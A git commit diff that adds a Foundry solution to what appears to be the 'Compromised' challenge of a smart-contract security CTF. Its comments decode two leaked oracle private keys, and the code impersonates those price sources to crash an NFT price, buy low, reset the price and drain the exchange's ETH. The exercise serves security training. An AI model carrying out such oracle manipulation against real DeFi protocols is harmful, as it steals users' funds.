c72f70e40e527781973bdddae2e2c68a5006e344
Chen <chencassc@gmail.com>
2025-06-01 12:47:36 +0800

    solve compromised: leaking private keys

--- test/compromised/Compromised.t.sol
+++ test/compromised/Compromised.t.sol
@@ -75,7 +75,50 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        uint256 price = oracle.getMedianPrice("DVNFT");
+
+        // The private keys for the first two sources can be decoded from the POST response in the readme file
+        // MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0
+        // 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+        //
+        // 4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30
+        //
+        // MHg2OGJkMDIwYWQxODZiNjQ3YTY5MWM2YTVjMGMxNTI5ZjIxZWNkMDlkY2M0NTI0MTQwMmFjNjBiYTM3N2M0MTU5
+        // 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
+        //
+        // 4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
+        vm.prank(sources[0]);
+        oracle.postPrice("DVNFT", 0);
+
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", 0);
+
+        assertEq(oracle.getMedianPrice("DVNFT"), 0, "NFT price should be 0");
+
+        tokenId = exchange.buyOne{value: 1}();
+
+        nft.approve(address(exchange), tokenId);
+
+
+        vm.prank(sources[0]);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        assertEq(oracle.getMedianPrice("DVNFT"), EXCHANGE_INITIAL_ETH_BALANCE, "NFT price should not change");
+        exchange.sellOne(tokenId);
+
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+    }
+
+    uint256 tokenId ;
+
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) public returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {
     }
 
     /**
